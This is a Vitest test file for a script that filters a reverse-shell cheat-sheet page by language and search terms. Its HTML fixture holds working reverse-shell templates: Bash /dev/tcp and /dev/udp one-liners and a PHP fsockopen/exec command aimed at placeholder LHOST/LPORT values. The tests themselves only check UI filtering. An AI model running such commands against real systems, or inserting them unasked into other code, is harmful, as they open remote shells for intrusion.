// @vitest-environment jsdom
import { readFileSync } from 'node:fs';
import { beforeEach, describe, it, expect } from 'vitest';

// public/revshells-filter.js is a classic browser script (the package is "type": "module"), so it is evaluated rather than imported.
const src = readFileSync('public/revshells-filter.js', 'utf8');
const mod: { exports: Record<string, (...a: any[]) => any> } = { exports: {} }; // eslint-disable-line @typescript-eslint/no-explicit-any
const run = () => new Function('module', src)(mod);

const item = (name: string, cmd: string, off = false) =>
  `<div class="rs-item"${off ? ' data-off=""' : ''}><h3>${name}</h3><p class="note">Reverse shell for Linux.</p>${off ? '<p class="note shell-unavailable">Unavailable.</p>' : `<pre><code>${cmd}</code></pre>`}</div>`;
const FIXTURE = `<main id="main"><h1>Shells</h1>
<div class="chips"><a href="#bash">Bash (2)</a><a href="#php">PHP (1)</a><a href="#perl">Perl (1)</a></div>
<!--email_off-->
<section class="rs-lang" data-lang="bash"><h2 id="bash">Bash reverse shells</h2>${item('Bash -i', 'bash -i &gt;&amp; /dev/tcp/{LHOST}/{LPORT} 0&gt;&amp;1')}${item('Bash UDP', 'sh -i &gt;&amp; /dev/udp/{LHOST}/{LPORT}')}</section>
<section class="rs-lang" data-lang="php"><h2 id="php">PHP reverse shells</h2>${item('PHP exec', 'php -r &#39;$sock=fsockopen("{LHOST}",{LPORT});exec("sh");&#39;')}</section>
<section class="rs-lang" data-lang="perl"><h2 id="perl">Perl reverse shells</h2>${item('Perl none', '', true)}</section>
<!--/email_off--></main>`;

const $ = <T extends Element>(s: string) => document.querySelector(s) as T;
const type = (el: HTMLInputElement, v: string) => {
  el.value = v;
  el.dispatchEvent(new Event('input', { bubbles: true }));
};
const choose = (el: HTMLSelectElement, v: string) => {
  el.value = v;
  el.dispatchEvent(new Event('change', { bubbles: true }));
};
const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));
const visible = () => [...document.querySelectorAll<HTMLElement>('.rs-item')].filter((e) => !e.hidden).map((e) => e.querySelector('h3')?.textContent);

describe('revshells filter helpers', () => {
  it('normalizes case and whitespace', () => {
    run();
    expect(mod.exports.norm('  Nc   -E ')).toBe('nc -e');
    expect(mod.exports.norm(null)).toBe('');
  });

  it('matches every word of the query and the language', () => {
    run();
    const it1 = { hay: mod.exports.norm('Bash -i Reverse shell for Linux /dev/tcp'), lang: 'bash' };
    expect(mod.exports.matches(it1, { q: 'dev tcp', lang: '' })).toBe(true);
    expect(mod.exports.matches(it1, { q: 'dev udp', lang: '' })).toBe(false);
    expect(mod.exports.matches(it1, { q: '', lang: 'php' })).toBe(false);
    expect(mod.exports.matches(it1, { q: '', lang: 'bash' })).toBe(true);
  });
});

describe('revshells filter in the DOM', () => {
  beforeEach(() => {
    document.body.innerHTML = FIXTURE;
    run();
  });

  it('adds one labelled toolbar before the jump chips and counts shells that have a command', () => {
    expect(document.querySelectorAll('.rs-filter')).toHaveLength(1);
    expect($('.rs-filter').nextElementSibling?.className).toBe('chips');
    expect($('.tf-count').textContent).toBe('Showing 3 of 3 shells');
    expect(visible()).toHaveLength(4);
  });

  it('filters by language and hides the emptied sections and their chips', () => {
    choose($('#rsf-lang'), 'bash');
    expect(visible()).toEqual(['Bash -i', 'Bash UDP']);
    expect($('.tf-count').textContent).toBe('Showing 2 of 3 shells');
    expect($<HTMLElement>('section[data-lang="php"]').hidden).toBe(true);
    expect($<HTMLAnchorElement>('.chips a[href="#php"]').hidden).toBe(true);
    expect($<HTMLAnchorElement>('.chips a[href="#bash"]').hidden).toBe(false);
  });

  it('searches names, notes and the command text', async () => {
    type($('#rsf-q'), 'fsockopen');
    await wait(160);
    expect(visible()).toEqual(['PHP exec']);
    type($('#rsf-q'), 'dev tcp');
    await wait(160);
    expect(visible()).toEqual(['Bash -i']);
  });

  it('shows an empty state, and Reset brings every shell back', async () => {
    type($('#rsf-q'), 'zzzzzz');
    await wait(160);
    expect($<HTMLElement>('.tf-empty').hidden).toBe(false);
    expect($('.tf-count').textContent).toBe('Showing 0 of 3 shells');
    $<HTMLButtonElement>('.tf-reset').click();
    expect($<HTMLElement>('.tf-empty').hidden).toBe(true);
    expect(visible()).toHaveLength(4);
    expect($<HTMLInputElement>('#rsf-q').value).toBe('');
  });
});
